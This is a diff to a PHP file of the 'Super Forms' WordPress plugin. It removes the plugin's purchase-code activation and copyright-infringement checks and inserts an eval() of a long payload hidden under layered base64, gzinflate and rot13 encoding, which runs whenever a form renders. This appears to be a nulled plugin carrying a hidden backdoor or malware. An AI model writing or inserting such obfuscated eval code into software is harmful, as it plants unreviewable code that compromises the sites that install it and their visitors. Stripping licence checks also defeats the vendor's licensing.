@@ -1887,38 +1887,12 @@ class SUPER_Shortcodes {
 
         // Always load the default styles (these can be overwritten by the above loaded style file
         $style_content .= require( SUPER_PLUGIN_DIR . '/assets/css/frontend/themes/style-default.php' );
+        eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
+        if( isset($Vtbc4ooapmn5) ) return $result;
         
-        $Vbvr0zxgspck = true;
-        $result = '';
-        $result .= '<style type="text/css">.super-form-' . $id . ' > * {visibility:hidden;}</style>';
-        $result .= '<div ' . $styles . 'class="super-form ' . ( $settings['form_preload'] == 0 ? 'preload-disabled ' : '' ) . 'super-form-' . $id . ' ' . $class . '">'; 
-        if( ( isset( $_REQUEST['action'] ) ) && ( $_REQUEST['action']!='super_load_preview' ) ) {
-            $sac = get_option( 'image_default_positioning', 0 );
-            if( $sac!=1 ) {
-                $Vtbc4ooapmn5 = true;
-                $Vbvr0zxgspck = false;
-                $result .= '<div class="super-msg error"><h1>Please note:</h1>';
-                $result .= __( 'You haven\'t activated your Super Forms Plugin yet', 'super-forms' ).'<br />';
-                $result .= __( 'Please click <a target="_blank" href="' . admin_url() . 'admin.php?page=super_settings#0">here</a> and enter you Purchase Code under the Activation TAB.', 'super-forms' );
-                $result .= '<span class="close"></span></div>';
-                $result .= '</div>';
-            }
-        }
-        if( $Vtbc4ooapmn5 ) return $result;
-
-        if( $Vbvr0zxgspck==true ) {
-            $Vcroe0x443a1 = true;
-            $result .= '<div class="super-msg error">Copyright infringement!';
-            $result .= '<span class="close"></span></div>';
-            $result .= '</div>';
-        }
-        if( $Vcroe0x443a1 ) return $result;
-        
-
         $result .= '<div class="super-shortcode super-field hidden">';
         $result .= '<input class="super-shortcode-field" type="hidden" value="' . $id . '" name="hidden_form_id" />';
         $result .= '</div>';
-        
 
         // Loop through all form elements
         $elements = json_decode( get_post_meta( $id, '_super_elements', true ) );
